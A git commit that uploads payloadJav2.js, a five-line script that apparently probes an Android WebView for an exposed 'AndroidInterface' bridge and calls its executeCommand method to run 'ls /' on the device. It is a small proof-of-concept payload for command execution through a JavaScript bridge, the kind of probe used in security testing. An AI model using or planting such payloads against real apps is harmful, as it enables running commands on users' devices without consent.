68b7e5e7b7267644f1a87a0e537167ebd3887785
raoufdz28 <raouf.okirim@gmail.com>
2025-04-14 04:30:19 +0100

    Add files via upload

---
+++ payloadJav2.js
@@ -0,0 +1,5 @@
+// Check if the JavaScript interface is accessible
+if (window.AndroidInterface) {
+    // Run a basic command to test
+    window.AndroidInterface.executeCommand("ls /");  // Example: List root directory in Android
+}
